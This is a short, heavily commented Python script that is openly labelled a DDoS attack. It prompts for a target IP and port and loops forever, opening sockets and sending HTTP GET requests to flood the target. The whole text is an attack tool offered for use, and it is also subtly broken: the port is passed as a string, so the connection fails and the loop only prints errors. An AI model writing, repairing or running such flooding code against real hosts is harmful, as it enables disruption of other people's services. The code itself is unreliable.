import socket # importing socket module

target_ip = input("Enter the target IP address: ") # asking for target IP address
target_port = input("Enter the target port: ") # asking for target port

def ddos_attack(): # defining ddos_attack function
    while True: # infinite loop
        try: # try block
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # creating socket object
            s.connect((target_ip, target_port)) # connecting to target
            request = "GET / HTTP/1.1\r\nHost: " + target_ip + "\r\n\r\n" # creating request
            print(f"Sending request: {request}") # prints a message indicating that a request is being sent
            s.sendall(request.encode()) # sends the request string to the target IP address and port
            s.close() # closing socket
        except Exception as e: # catches any exceptions that occur during the execution of the code
            print(f"Error: {e}") # prints the error message

ddos_attack() # calling ddos_attack function
